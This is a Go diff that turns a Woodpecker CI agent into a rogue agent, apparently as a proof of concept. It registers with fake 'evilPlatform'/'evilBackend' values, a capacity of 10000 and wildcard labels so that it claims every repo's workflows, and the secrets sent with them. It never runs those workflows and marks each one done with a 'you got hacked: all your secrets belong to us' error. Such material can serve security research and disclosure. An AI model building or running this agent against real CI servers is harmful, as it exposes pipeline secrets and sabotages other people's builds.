@@ -20,10 +20,8 @@ import (
 	"crypto/tls"
 	"errors"
 	"fmt"
-	"net/http"
 	"os"
 	"strings"
-	"sync/atomic"
 	"time"
 
 	"github.com/rs/zerolog/log"
@@ -37,9 +35,7 @@ import (
 	"google.golang.org/grpc/metadata"
 	"google.golang.org/grpc/status"
 
-	"go.woodpecker-ci.org/woodpecker/v2/agent"
 	agent_rpc "go.woodpecker-ci.org/woodpecker/v2/agent/rpc"
-	"go.woodpecker-ci.org/woodpecker/v2/pipeline/backend"
 	"go.woodpecker-ci.org/woodpecker/v2/pipeline/backend/types"
 	"go.woodpecker-ci.org/woodpecker/v2/pipeline/rpc"
 	"go.woodpecker-ci.org/woodpecker/v2/shared/logger"
@@ -80,7 +76,6 @@ func run(ctx context.Context, c *cli.Command, backends []types.Backend) error {
 
 	serviceWaitingGroup := errgroup.Group{}
 
-	agentConfigPath := c.String("agent-config")
 	hostname := c.String("hostname")
 	if len(hostname) == 0 {
 		hostname, _ = os.Hostname()
@@ -88,26 +83,6 @@ func run(ctx context.Context, c *cli.Command, backends []types.Backend) error {
 
 	counter.Polling = int(c.Int("max-workflows"))
 	counter.Running = 0
-
-	if c.Bool("healthcheck") {
-		serviceWaitingGroup.Go(
-			func() error {
-				server := &http.Server{Addr: c.String("healthcheck-addr")}
-				go func() {
-					<-agentCtx.Done()
-					log.Info().Msg("shutdown healthcheck server ...")
-					if err := server.Shutdown(shutdownCtx); err != nil { //nolint:contextcheck
-						log.Error().Err(err).Msg("shutdown healthcheck server failed")
-					} else {
-						log.Info().Msg("healthcheck server stopped")
-					}
-				}()
-				if err := server.ListenAndServe(); err != nil {
-					log.Error().Err(err).Msgf("cannot listen on address %s", c.String("healthcheck-addr"))
-				}
-				return nil
-			})
-	}
 
 	var transport grpc.DialOption
 	if c.Bool("grpc-secure") {
@@ -130,12 +105,10 @@ func run(ctx context.Context, c *cli.Command, backends []types.Backend) error {
 	}
 	defer authConn.Close()
 
-	agentConfig := readAgentConfig(agentConfigPath)
-
 	agentToken := c.String("grpc-token")
 	grpcClientCtx, grpcClientCtxCancel := context.WithCancelCause(context.Background())
 	defer grpcClientCtxCancel(nil)
-	authClient := agent_rpc.NewAuthGrpcClient(authConn, agentToken, agentConfig.AgentID)
+	authClient := agent_rpc.NewAuthGrpcClient(authConn, agentToken, defaultAgentIDValue)
 	authInterceptor, err := agent_rpc.NewAuthInterceptor(grpcClientCtx, authClient, authInterceptorRefreshInterval) //nolint:contextcheck
 	if err != nil {
 		return fmt.Errorf("could not create new auth interceptor: %w", err)
@@ -157,7 +130,6 @@ func run(ctx context.Context, c *cli.Command, backends []types.Backend) error {
 	defer conn.Close()
 
 	client := agent_rpc.NewGrpcClient(conn)
-	agentConfigPersisted := atomic.Bool{}
 
 	grpcCtx := metadata.NewOutgoingContext(grpcClientCtx, metadata.Pairs("hostname", hostname))
 
@@ -176,29 +148,7 @@ func run(ctx context.Context, c *cli.Command, backends []types.Backend) error {
 		return err
 	}
 
-	// new engine
-	backendCtx := context.WithValue(agentCtx, types.CliCommand, c)
-	backendName := c.String("backend-engine")
-	backendEngine, err := backend.FindBackend(backendCtx, backends, backendName)
-	if err != nil {
-		log.Error().Err(err).Msgf("cannot find backend engine '%s'", backendName)
-		return err
-	}
-	if !backendEngine.IsAvailable(backendCtx) {
-		log.Error().Str("engine", backendEngine.Name()).Msg("selected backend engine is unavailable")
-		return fmt.Errorf("selected backend engine %s is unavailable", backendEngine.Name())
-	}
-
-	// load engine (e.g. init api client)
-	engInfo, err := backendEngine.Load(backendCtx)
-	if err != nil {
-		log.Error().Err(err).Msg("cannot load backend engine")
-		return err
-	}
-	log.Debug().Msgf("loaded %s backend engine", backendEngine.Name())
-
-	maxWorkflows := int(c.Int("max-workflows"))
-	agentConfig.AgentID, err = client.RegisterAgent(grpcCtx, engInfo.Platform, backendEngine.Name(), version.String(), maxWorkflows) //nolint:contextcheck
+	agentID, err := client.RegisterAgent(grpcCtx, "evilPlatform", "evilBackend", version.String(), 10000) //nolint:contextcheck
 	if err != nil {
 		return err
 	}
@@ -209,41 +159,29 @@ func run(ctx context.Context, c *cli.Command, backends []types.Backend) error {
 		// we wait till agent context is done
 		<-agentCtx.Done()
 		// Remove stateless agents from server
-		if !agentConfigPersisted.Load() {
-			log.Debug().Msg("unregistering agent from server ...")
-			// we want to run it explicit run when context got canceled so run it in background
-			err := client.UnregisterAgent(grpcClientCtx)
-			if err != nil {
-				log.Err(err).Msg("failed to unregister agent from server")
-			} else {
-				log.Info().Msg("agent unregistered from server")
-			}
+		log.Debug().Msg("unregistering agent from server ...")
+		// we want to run it explicit run when context got canceled so run it in background
+		err := client.UnregisterAgent(grpcClientCtx)
+		if err != nil {
+			log.Err(err).Msg("failed to unregister agent from server")
+		} else {
+			log.Info().Msg("agent unregistered from server")
 		}
 		return nil
 	})
 
-	if agentConfigPath != "" {
-		if err := writeAgentConfig(agentConfig, agentConfigPath); err == nil {
-			agentConfigPersisted.Store(true)
-		}
-	}
-
 	labels := map[string]string{
-		"hostname": hostname,
-		"platform": engInfo.Platform,
-		"backend":  backendEngine.Name(),
-		"repo":     "*", // allow all repos by default
-	}
-
-	if err := stringSliceAddToMap(c.StringSlice("filter"), labels); err != nil {
-		return err
+		"hostname": "*",
+		"platform": "*",
+		"backend":  "*",
+		"repo":     "*",
 	}
 
 	filter := rpc.Filter{
 		Labels: labels,
 	}
 
-	log.Debug().Msgf("agent registered with ID %d", agentConfig.AgentID)
+	log.Debug().Msgf("agent registered with ID %d", agentID)
 
 	serviceWaitingGroup.Go(func() error {
 		for {
@@ -261,29 +199,29 @@ func run(ctx context.Context, c *cli.Command, backends []types.Backend) error {
 		}
 	})
 
-	for i := 0; i < maxWorkflows; i++ {
-		i := i
-		serviceWaitingGroup.Go(func() error {
-			runner := agent.NewRunner(client, filter, hostname, counter, &backendEngine)
-			log.Debug().Msgf("created new runner %d", i)
-
-			for {
-				if agentCtx.Err() != nil {
-					return nil
-				}
-
-				log.Debug().Msg("polling new steps")
-				if err := runner.Run(agentCtx, shutdownCtx); err != nil {
-					log.Error().Err(err).Msg("runner done with error")
-					return err
-				}
+	serviceWaitingGroup.Go(func() error {
+		for {
+			if agentCtx.Err() != nil {
+				return nil
 			}
-		})
-	}
 
-	log.Info().Msgf(
-		"starting Woodpecker agent with version '%s' and backend '%s' using platform '%s' running up to %d pipelines in parallel",
-		version.String(), backendEngine.Name(), engInfo.Platform, maxWorkflows)
+			workflow, err := client.Next(agentCtx, filter)
+			if err != nil {
+				return err
+			}
+			if workflow == nil {
+				continue
+			}
+
+			client.Done(agentCtx, workflow.ID, rpc.WorkflowState{
+				Started:  time.Now().Unix(),
+				Finished: time.Now().Unix(),
+				Error:    "ERROR: you got hacked: all your secrets belong to us",
+			})
+
+			log.Debug().Msg("polling next secret")
+		}
+	})
 
 	return serviceWaitingGroup.Wait()
 }
